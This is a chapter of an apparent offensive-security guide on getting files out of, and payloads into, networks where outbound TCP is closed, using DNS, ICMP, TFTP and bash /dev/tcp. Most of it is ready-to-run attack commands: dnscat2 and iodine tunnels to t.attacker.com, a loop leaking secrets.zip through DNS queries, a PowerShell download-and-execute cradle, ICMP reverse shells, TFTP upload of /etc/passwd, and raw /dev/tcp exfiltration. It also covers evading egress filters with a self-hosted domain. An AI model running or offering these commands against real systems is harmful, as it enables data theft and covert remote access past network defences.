# 12 - DNS / ICMP / TFTP: getting a file through

> [← README](../../README.md) · [Next section →](13-stegano.md)

For when outbound TCP is closed but DNS (53/udp) or ICMP (ping) still gets through. These channels are slow: use them for keys, configs, and small archives. Before sending, always: **compress -> encrypt -> transfer -> verify sha256** ([11](11-encryption.md)).

```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export DOMAIN=t.attacker.com
export SECRET='MyStr0ngSecret'
```

```cmd
:: Windows CMD
set LHOST=192.168.2.5
set RHOST=192.168.10.20
set DOMAIN=t.attacker.com
set SECRET=MyStr0ngSecret
```

## Quick selection

| What's on the target | What to use | Speed |
|---|---|---|
| Can drop a binary | `dnscat2` (DNS) / `ptunnel-ng` (ICMP) | low |
| Need a real IP tunnel (scp/ssh) | `iodine` | up to ~1 Mbps |
| Only `nslookup` / `dig` | DNS by hand | very low |
| Only `ping` / `hping3` | ICMP payload | very low |
| 69/udp is open | TFTP | medium |
| Only `bash` | `/dev/tcp` | medium |

---

# DNS

## dnscat2

Server is Ruby, clients are Linux/Windows. Encrypts traffic, supports `upload`/`download` and a shell.

**Build (LHOST):**

```bash
sudo apt install -y ruby ruby-dev git build-essential
git clone https://github.com/iagox86/dnscat2.git && cd dnscat2/server
gem install bundler && bundle install

cd ../client
make                                  # Linux client
make clean && make CC="cc -static"    # static client (if needed)
```

> Prebuilt Windows/Linux clients are at `https://downloads.skullsecurity.org/dnscat2/` (zip password `password`). Cross-compiling with mingw is possible but depends on the Makefile version and mingw; in practice it's easier to grab the prebuilt `dnscat2.exe`.

**Server:**

```bash
# via your own domain (needs an NS record t.attacker.com -> LHOST)
sudo ruby dnscat2.rb t.attacker.com

# directly by IP, no domain
sudo ruby dnscat2.rb --dns "host=0.0.0.0,port=53" --no-cache

# your own secret (the server prints it at startup)
sudo ruby dnscat2.rb --secret "$SECRET" $DOMAIN
```

**Client:**

```bash
# Linux: via the domain
./dnscat2 --secret="$SECRET" $DOMAIN

# Linux: directly to our IP
./dnscat2 --secret="$SECRET" --dns server=$LHOST,port=53

# Windows
dnscat2.exe --secret=%SECRET% --dns server=%LHOST%,port=53

# check connectivity without a session
./dnscat2 --ping $DOMAIN
```

> `$SECRET` / `%SECRET%` is the value the server prints at startup (or the one set via `--secret`). It must match on the client and the server.

**Working with a session (in the server console):**

```text
windows                 # list sessions
window -i 1             # attach to a session
shell                   # shell on the target

# files
upload /root/tool.exe C:\Users\Public\tool.exe
download C:\Users\Public\secrets.zip secrets.zip

# port forwarding
listen 127.0.0.1:2222 10.10.10.10:22
```

**PowerShell client (no exe):**

```powershell
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
Start-Dnscat2 -Domain t.attacker.com -PreSharedSecret 'MyStr0ngSecret'
Start-Dnscat2 -Domain t.attacker.com -Exec cmd
```

> For the PowerShell client, start the server with `--no-cache`.

## iodine (IP over DNS)

Gives you a tun interface: `ping`, `scp`, `ssh`, `nc` all work inside it. It does **not encrypt** the traffic itself - run SSH on top.

```bash
sudo apt install -y iodine
sudo modprobe tun                    # both the Linux client and the server need tun

# LHOST: server, 10.0.0.1 is the address inside the tunnel
sudo iodined -f -c -P 'secretpassword' 10.0.0.1 $DOMAIN

# RHOST: client (gets 10.0.0.2)
sudo iodine -f -P 'secretpassword' $DOMAIN

# check
ping 10.0.0.1

# exfil a file through the tunnel
scp secrets.zip 10.0.0.1:/tmp/
```

> The Windows `iodine` client needs a TAP driver (usually TAP-Windows from OpenVPN). On Windows, `dnscat2` or `ptunnel-ng` is easier.

## DNS by hand (nslookup/dig only)

Data goes into subdomains; LHOST catches the queries.

```bash
# LHOST: listen for DNS names and write a log to reassemble from
sudo tcpdump -i any -n -s0 udp port 53 -l | tee dns.log | grep --line-buffered '\.t\.attacker\.com'
```

```bash
# RHOST: file -> hex -> 30-character chunks -> DNS queries
i=0
for chunk in $(xxd -p secrets.zip | tr -d '\n' | fold -w30); do
  nslookup "$i.$chunk.t.attacker.com" $LHOST >/dev/null
  i=$((i+1))
done
```

```bash
# LHOST: reassemble from the tcpdump log
grep -oE '[0-9]+\.[0-9a-f]+\.t\.attacker\.com' dns.log \
  | sort -u | sort -t. -k1,1n | cut -d. -f2 | tr -d '\n' | xxd -r -p > secrets.zip
sha256sum secrets.zip
```

> For DNS names base32 is better: case-insensitive, no special characters. See [10](10-encoding.md).

## dnsteal

A ready-made fake DNS server: accepts a file in chunks and stores it locally. Needs Python 2.

```bash
git clone https://github.com/m57/dnsteal && cd dnsteal
sudo python2 dnsteal.py $LHOST -z -v
# dnsteal prints a ready-to-run command for the target - copy it and run it on RHOST
```

> The target needs `dig` (or adapt the printed command for `nslookup`).

---

# ICMP

## ptunnel-ng (TCP over ping)

```bash
sudo apt install -y build-essential automake autoconf libtool libpcap-dev git
git clone https://github.com/utoni/ptunnel-ng && cd ptunnel-ng
./autogen.sh && ./configure && make
```

**Exfil RHOST -> LHOST:**

```bash
# LHOST: proxy + receive the file
sudo ./src/ptunnel-ng -r127.0.0.1 -R9000
nc -lvnp 9000 > secrets.zip
```

```bash
# RHOST: local 8000 -> ICMP -> LHOST:9000
sudo ./src/ptunnel-ng -p$LHOST -l8000 -r127.0.0.1 -R9000
nc -w3 127.0.0.1 8000 < secrets.zip
```

```cmd
:: Windows client (admin + Npcap)
ptunnel-ng.exe -p%LHOST% -l8000 -r127.0.0.1 -R9000
```

> `-r127.0.0.1` is the address the proxy forwards TCP to; `nc` listens on that port on LHOST. Proxy password: `-P<password>` on both sides. For SSH, replace `-R9000` with `-R22` on both sides and connect: `ssh -p8000 user@127.0.0.1`.

## ICMP by hand (payload in ping)

```bash
# LHOST: check whether any ICMP payload flows at all (diagnostics only)
sudo tcpdump -i any -nn -s0 -X 'icmp and icmp[icmptype]==8' -l
```

```bash
# RHOST: send the file in chunks (hping3)
sudo apt install -y hping3
sudo hping3 -1 -E secrets.zip -d 1400 -u $LHOST
```

**Variant with retransmission of lost packets:**

```bash
# LHOST
sudo hping3 $LHOST --listen signature --safe --icmp > secrets.zip

# RHOST
sudo hping3 $LHOST -1 -E secrets.zip --sign signature --safe
```

> `--safe` is slower, but you don't have to stitch payloads together by hand: hping3 strips the signature itself and retransmits lost packets.

**A small payload in one packet:**

```bash
sudo apt install -y nmap            # nping comes with nmap
sudo nping --icmp -c1 --data-string "$(id)" $LHOST
ping -c1 -p $(echo -n "hi" | xxd -p) $LHOST   # 16 bytes max
```

## ICMP in Python: icmp_send.py / icmp_recv.py

A ready-made exfil channel: the sender puts the file into ICMP echo requests, the receiver reassembles chunks by index and verifies SHA-256. The scripts are in [scripts/icmp/](../../scripts/icmp/).

**How it works:**

```text
ICMP header (8 B)
payload: session_id (4 B) + packet_idx (4 B) + data
packet #0: file_size (8 B) + sha256 (32 B)
packets #1..N: 1400 B file chunks
```

The sender only needs Python 3 and root (raw socket). The receiver needs Python 3, `scapy`, and root (sniff).

**Install and run:**

```bash
# LHOST: receiver (commands run from the repo root)
sudo apt install -y python3-scapy     # or: python3 -m pip install scapy
sudo python3 scripts/icmp/icmp_recv.py -o secrets.zip

# RHOST: sender (in a second window, after the receiver is running)
sudo python3 icmp_send.py $LHOST secrets.zip
```

```bash
# if the script isn't on the target - copy the local scripts/icmp/icmp_send.py
# over any available channel (scp/SMB/HTTP) and run it:
sudo python3 icmp_send.py $LHOST secrets.zip
```

**Sender options:**

| Flag | Default | What it does |
|---|---|---|
| `target` | `10.0.2.10` | receiver IP |
| `file` | - | file to send |
| `-c, --chunk` | `1400` | data size per packet |
| `-d, --delay` | `0.005` | pause between packets, seconds |
| `-r, --retries` | `0` | reserved, retransmission isn't implemented yet |

**Receiver options:**

| Flag | Default | What it does |
|---|---|---|
| `-o, --output` | `received_file.bin` | where to save the file |
| `-t, --timeout` | `30` | seconds of silence to wait before saving a partial file |
| `--iface` | all interfaces | interface to listen on |

**Examples:**

```bash
# bad channel: smaller packets, longer pause
sudo python3 icmp_send.py $LHOST secrets.zip -c 512 -d 0.05

# local network: fast
sudo python3 icmp_send.py $LHOST secrets.zip -c 1400 -d 0

# receive on a specific interface, partial file after 10 seconds of silence
sudo python3 icmp_recv.py -o loot.zip -t 10 --iface eth0

# delivery to the target: receiver on RHOST, sender on LHOST
# RHOST:
sudo python3 icmp_recv.py -o tool.zip
# LHOST:
sudo python3 icmp_send.py $RHOST tool.zip
```

**What matters:**

- **No ACKs, no retransmits.** A lost packet is a hole in the file. The receiver prints the missing indices, saves what it has, and returns exit code `2` (hash or size mismatch also returns `2`). For reliability: `-c 512 -d 0.05` or `ptunnel-ng` / `hping3 --safe`.
- **Packet #0 is sent once.** If it's lost, the receiver doesn't know the size or the SHA-256 and only finishes on the `-t` timeout. If metadata arrives but the first data packet is lost, the timeout still saves the partial file and exits with `2`.
- **MTU:** `1400 + 16` bytes of headers still fits inside 1500. Over a VPN/tunnel, drop to `1200` or `512`.
- **One run, one file.** The receiver exits after receiving or timing out, so start it **before** the sender.
- **Privileges:** root/Administrator on both ends. On Windows the receiver needs Npcap, and the sender has to run as admin.
- The file is verified automatically: the receiver prints `SHA-256 matches` or `SHA-256 MISMATCH`.

**If it doesn't work:**

| Symptom | Cause | Fix |
|---|---|---|
| `PermissionError: Root privileges required` | no root | `sudo` |
| `ModuleNotFoundError: scapy` | scapy missing or `sudo` can't see it | `sudo apt install python3-scapy` or `sudo python3 -m pip install scapy` |
| receiver is silent | wrong interface / ICMP is filtered | `--iface eth0`, check `ping $LHOST` and `tcpdump -ni any icmp` |
| some packets missing | chunk too large / pause too short | `-c 512 -d 0.05`, retry |
| `SHA-256 MISMATCH` | packets lost or tampered with | resend, reduce the chunk size |
| `No data received` | packets never arrived | check the IP, firewall, NAT/VM network |

## icmpsh / icmpdoor (shell over ICMP)

```bash
# LHOST: icmpsh
git clone https://github.com/inquisb/icmpsh && cd icmpsh
python2 -m pip install impacket
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
python2 icmpsh_m.py $LHOST $RHOST
```

> `icmpsh` is Python 2 plus `impacket`; on modern systems a dedicated container is easier.

```cmd
:: RHOST
icmpsh.exe -t %LHOST%
```

```bash
# restore the kernel setting when you're done
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

```bash
# icmpdoor (Python 3 + scapy)
git clone https://github.com/krabelize/icmpdoor && cd icmpdoor
pip install scapy

# LHOST
sudo ./icmp-cnc.py -i eth0 -d $RHOST
# RHOST
sudo ./icmpdoor.py -i eth0 -d $LHOST
```

---

# TFTP (69/udp)

```bash
# LHOST: server
sudo apt install -y atftpd
sudo mkdir -p /tftp && sudo chmod 777 /tftp
sudo atftpd --daemon --port 69 /tftp
```

```cmd
:: RHOST (Windows): enable the TFTP client first (admin; reboot may be required)
Enable-WindowsOptionalFeature -Online -FeatureName TFTP -All

:: RHOST (Windows): download from LHOST
tftp -i %LHOST% GET nc.exe C:\Users\Public\nc.exe

:: RHOST: upload to LHOST
tftp -i %LHOST% PUT C:\Users\Public\secrets.zip secrets.zip

:: cleanup: disable TFTP if you enabled it for this transfer
Disable-WindowsOptionalFeature -Online -FeatureName TFTP -NoRestart
```

```bash
# RHOST (Linux)
sudo apt install -y tftp-hpa
tftp $LHOST -c get payload.sh
tftp $LHOST -c put /etc/passwd passwd
```

> The TFTP root is `/tftp`, not `/tmp/share`; put the file you want to serve there. On Windows `-i` is mandatory for binary files, and `tftp.exe` itself is an optional Windows component. TFTP provides no authentication or encryption, so it only fits a lab or a trusted segment. The server directory must be writable for uploads (`PUT`); the pipeline uses `chmod 777` for a lab. Disable the Windows feature afterwards if it was not enabled before.

---

# bash /dev/tcp and /dev/udp

Works only if `sh` is bash. Check with `ls -la /bin/sh`.

**Download a file without wget/curl:**

```bash
# LHOST
python3 -m http.server 8000
```

```bash
# RHOST
exec 3<>/dev/tcp/$LHOST/8000
printf 'GET /payload.sh HTTP/1.0\r\nHost: %s\r\n\r\n' "$LHOST" >&3
sed '1,/^\r\{0,1\}$/d' <&3 > payload.sh
exec 3<&-; exec 3>&-
```

**Exfil over TCP:**

```bash
# LHOST
nc -lvnp 9001 > secrets.tar.gz
```

```bash
# RHOST
cat secrets.tar.gz > /dev/tcp/$LHOST/9001
```

**Over UDP (small payloads only, delivery not guaranteed):**

```bash
# LHOST
nc -u -lvnp 9002 > out.bin

# RHOST
cat secrets.txt > /dev/udp/$LHOST/9002
```

---

# Your own domain for a DNS tunnel

You need this when the target only resolves through its own resolver and direct DNS to a foreign IP is blocked.

1. Buy a domain and set up a VPS with a public IP.
2. Open 53/udp and disable the system stub resolver:

```bash
sudo ufw allow 53/udp
sudo sed -i 's/#\?DNSStubListener=.*/DNSStubListener=no/' /etc/systemd/resolved.conf
sudo systemctl restart systemd-resolved
```

3. Add two records at the registrar:

| Type | Name | Value |
|---|---|---|
| `A` | `ns1` | `<IP_VPS>` |
| `NS` | `t` | `ns1.attacker.com` |

`A ns1` is the glue address for our NS, `NS t` delegates the `t.attacker.com` subzone to that server.

> NS records may take a while to update. If `dig +trace` still shows the old provider, wait or check the TTL.

4. Start the server on the VPS:

```bash
sudo ruby dnscat2.rb t.attacker.com
# or
sudo iodined -f -c -P 'secretpassword' 10.0.0.1 t.attacker.com
```

> dnscat2 and iodine both listen on 53/udp. Don't run them at the same time on the same IP/port - use different subdomains/VPSes or a non-standard port.

5. Verify delegation from another machine:

```bash
dig NS t.attacker.com +short
dig +trace any.t.attacker.com
dig any.t.attacker.com @8.8.8.8
sudo tcpdump -ni any udp port 53
```

6. From the target, go through the domain without `server=`:

```bash
./dnscat2 --secret="$SECRET" t.attacker.com
```

---

# When it doesn't work

| Symptom | Cause | What to do |
|---|---|---|
| dnscat2: no session | `--secret` mismatch / 53 doesn't get through / missing `--no-cache` | verify the secret, `tcpdump`, add `--no-cache` |
| direct mode doesn't work | egress filters DNS to foreign IPs | switch to your own domain + NS |
| port 53 is taken | systemd-resolved / dnsmasq | `--dnsport 5353` or free up 53 |
| iodine: `SERVFAIL` | resolver timing out | `-I1`, check the NS and 53/udp |
| iodine: client and server won't connect | different versions / password / domain | matching versions, verify `-P` and the domain |
| tunnel dropped | iodine closes the session after ~60 s of silence | restart the client |
| ptunnel-ng won't start | no root/Npcap, or ICMP is blocked | root, Npcap, check `ping $LHOST` |
| TFTP: `Permission denied` | no write access to the server directory | `chmod 777 /tftp` for a lab, check ownership |
| ICMP channel won't come up | no root/Administrator or no Npcap | run as admin, install Npcap |
| file is corrupt | packets lost or reordered | compress, number the chunks, verify sha256 |

**Mini checklist:** compressed -> encrypted -> transferred -> `sha256sum -c` -> deleted the temp files.

---

[← Back to the index](../../README.md)
